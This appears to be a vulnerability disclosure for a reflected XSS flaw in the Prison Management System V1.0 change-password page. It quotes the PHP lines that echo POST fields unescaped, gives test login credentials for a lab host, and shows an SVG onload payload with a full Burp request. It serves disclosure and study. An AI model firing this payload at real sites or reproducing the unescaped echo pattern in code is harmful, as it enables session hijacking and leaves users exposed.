# Prison Management System
## XSS on `/Employee/changepassword.php `

### Vendor Homepage:

```
https://www.sourcecodester.com/sql/17287/prison-management-system.html
```

### Version:

```
V1.0
```

### Tested on:

```
PHP, Apache, MySQL
```

### Credentials:

```
http://192.168.150.131/Account/Login.php
releaseme@gmail.com
escobar2012
```

### Affected Page:

```
/Employee/changepassword.php
```

The parameter  `txtold_password`、`txtnew_password` and `txtconfirm_password` are being echoed directly into the HTML without proper sanitization or validation. This allows an attacker to inject arbitrary JavaScript code into the page, leading to XSS attacks.

```php
# /Employee/changepassword.php
167 <input type="password" name="txtold_password" value="<?php if (isset($_POST['txtold_password']))?><?php echo $_POST['txtold_password']; ?>" placeholder="Enter Old Password" class="form-control" required="">
171 <input type="password" name="txtnew_password" value="<?php if (isset($_POST['txtnew_password']))?><?php echo $_POST['txtnew_password']; ?>" placeholder="Enter New Password" class="form-control" required="">
175 <input type="password" name="txtconfirm_password" value="<?php if (isset($_POST['txtconfirm_password']))?><?php echo $_POST['txtconfirm_password']; ?>" placeholder="Confirm New Password" class="form-control" required="">
```

### Proof of Concept:

Payload:

```
"><svg/onload=alert``>
```

Burp Request:

```
POST /Employee/changepassword.php HTTP/1.1
Host: 192.168.150.131
Content-Length: 144
Cache-Control: max-age=0
Origin: http://192.168.150.131
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.150.131/Employee/changepassword.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=re6pj5dm375a34vsuggjn5p4j8
Connection: close

txtold_password=1"><svg/onload=alert`111`>&txtnew_password=2"><svg/onload=alert`222`>&txtconfirm_password=3"><svg/onload=alert`333`>&btnchange=1
```



### Screenshot

![image-20240506135148327](./screenshot/image-20240506135148327.png)

![image-20240506135106046](./screenshot/image-20240506135106046.png)

![image-20240506135126428](./screenshot/image-20240506135126428.png)

